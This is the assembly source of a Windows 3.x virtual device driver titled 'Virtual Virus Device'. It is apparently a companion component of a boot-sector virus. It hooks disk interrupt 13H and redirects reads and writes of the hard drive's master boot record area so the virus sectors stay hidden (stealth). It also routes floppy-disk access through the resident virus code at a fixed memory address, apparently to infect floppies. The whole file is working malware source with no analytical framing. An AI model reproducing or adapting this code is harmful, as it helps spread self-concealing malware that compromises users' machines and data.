;******************************************************************************
TITLE VVD.ASM - Virtual Virus Device
;******************************************************************************

        .386p


;******************************************************************************
;                             I N C L U D E S
;******************************************************************************

        .XLIST
        INCLUDE VMM.Inc
        .LIST

;******************************************************************************
;                V I R T U A L   D E V I C E   D E C L A R A T I O N
;******************************************************************************

Declare_Virtual_Device VVD, 3, 0, VVD_Control, TSRLoad_Device_ID, \
                       Undefined_Init_Order, ,


;******************************************************************************
;                  I N I T I A L I Z A T I O N   D A T A
;******************************************************************************

VxD_IDATA_SEG

VxD_IDATA_ENDS

;******************************************************************************
;             R E A L   M O D E   I N I T I A L I Z A T I O N
;******************************************************************************

VxD_REAL_INIT_SEG

BeginProc VVD_Real_Mode_Init

        xor     bx, bx                  ;nothing to do here
        xor     si, si                  ;except tell windows that
        mov     ax, Device_Load_Ok      ;everything's ok
        ret

EndProc VVD_Real_Mode_Init

VxD_REAL_INIT_ENDS

;******************************************************************************
;              D E V I C E   C O N T R O L   P R O C E D U R E
;******************************************************************************

VxD_CODE_SEG

BeginProc VVD_Control

        Control_Dispatch Device_Init, VVD_Device_Init
        Control_Dispatch Init_Complete, VVD_Init_Complete

        clc                                     ; Ignore other control calls
        ret

EndProc VVD_Control

VxD_CODE_ENDS


;******************************************************************************
;                   I N I T I A L I Z A T I O N   C O D E
;******************************************************************************

VxD_ICODE_SEG

BeginProc VVD_Device_Init

        mov     eax,13H                 ;hook V86 int 13 handler
        mov     esi,OFFSET32 HD_HANDLER
        VMMcall Hook_V86_Int_Chain
        clc                             ;say everything's clear
        ret

EndProc VVD_Device_Init

BeginProc VVD_Init_Complete

        clc                             ;say everything's clear
        ret

EndProc VVD_Init_Complete

VxD_ICODE_ENDS

VxD_CODE_SEG

;******************************************************************************
;                   V86 I N T E R R U P T   H A N D L E R S
;******************************************************************************

;******************************************************************************
;
;   HD_HANDLER
;
;   DESCRIPTON: Redirects attempts to read the master boot record
;
;==============================================================================

VIRUS_SECTORS   EQU     4                       ;sectors to redirect

BeginProc HD_HANDLER
        cmp     [ebp.Client_AH],2               ;is this a read or write?
        je      SHORT CHECK_HD
        cmp     [ebp.Client_AH],3
        jne     SHORT REFLECT_HD                ;not read/write, ignore it

CHECK_HD:
        test    [ebp.Client_DL],80H             ;floppy disk?
        jz      SHORT HANDLE_FLOPPY             ;yes, go handle it
        cmp     [ebp.Client_DL],80H             ;Hard drive C:?
        jne     SHORT REFLECT_HD                ;no, don't stealth
        cmp     [ebp.Client_DH],0               ;ok, c:, so just stealth the
        jne     SHORT REFLECT_HD                ;virus by adjusting read/write
        cmp     [ebp.Client_CX],VIRUS_SECTORS+1 ;cylinder 0, in the virus?
        jg      SHORT REFLECT_HD
        add     [ebp.Client_CL],VIRUS_SECTORS+1 ;redirect the read/write
        jmp     SHORT REFLECT_HD
REFLECT_HD:                     ;reflect interrupt to next VxD or to V86 handler
        stc
        ret

HANDLE_FLOPPY:
        mov     eax,13H                 ;save Interrupt 13H vector
        VMMCall Get_V86_Int_Vector
        mov     [OLD_13H],edx
        mov     WORD PTR [OLD_13H+4],cx

        mov     eax,[ebp.Client_EAX]
        mov     ebx,[ebp.Client_EBX]
        shl     eax,16
        and     ebx,0000FFFFH
        or      ebx,eax                 ;ebx hi word = ax, lo word = bx
        shl     ecx,16
        or      ecx,edx                 ;ecx=cs:ip of old Int 13H vector
        mov     [ebp.Client_EAX],ecx
        mov     [ebp.Client_EBX],ebx    ;set up client registers this way

        mov     eax,13H                 ;set Int 13H to go through virus
        mov     cx,9820H
        mov     edx,7204H
        VMMCall Set_V86_Int_Vector

        mov     ecx,Block_Svc_Ints or Block_Enable_Ints
        VMMCall Begin_Critical_Section

        xor     eax,eax
        xor     edx,edx
        mov     esi,OFFSET32 HD_RETURN
        VMMCall Call_When_VM_Returns

        stc                             ;reflect to next VxD
        ret

EndProc HD_HANDLER

BeginProc HD_RETURN

        VMMCall End_Critical_Section

        mov     eax,13H
        mov     cx,WORD PTR [OLD_13H+4]
        mov     edx,[OLD_13H]
        VMMCall Set_V86_Int_Vector

        ret

EndProc HD_RETURN

VxD_CODE_ENDS

VxD_LOCKED_DATA_SEG

OLD_13H DD      0
        DW      0

VxD_LOCKED_DATA_ENDS

        END VVD_Real_Mode_Init
